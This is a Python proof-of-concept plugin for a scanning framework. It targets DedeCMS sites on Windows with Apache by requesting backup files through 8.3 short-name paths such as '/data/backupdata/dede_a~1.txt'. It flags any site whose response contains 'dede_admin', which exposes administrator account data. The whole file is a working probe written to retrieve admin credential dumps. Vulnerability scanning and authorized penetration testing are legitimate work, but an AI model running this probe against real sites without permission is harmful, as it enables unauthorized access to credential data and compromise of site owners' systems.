#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'dedecms win apache shortfile'
        self.keyword = ['dedecms', 'win', 'apache', 'shortfile']
        self.info = 'Search admin\' infomation for dedecms with apache, windows and shorf file.'
        self.type = 'burst'
        self.level = 'medium'
        Script.__init__(self, target=target, service_type=self.service_type)

    def prove(self):
        self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './'),
            ]))
            for path in path_list:
                dir = '/data/backupdata/dede_a~'
                for i in range(1, 6):
                    url = path + dir + str(i) + '.txt'
                    try:
                        res = self.curl('get',url)
                        if res.status_code == 200 :
                            if 'dede_admin' in res.text:
                                self.flag = 1
                            self.req.append({"url": url})
                            self.res.append({"info": url, "key": 'dede_admin'})
                    except Exception as e:
                        continue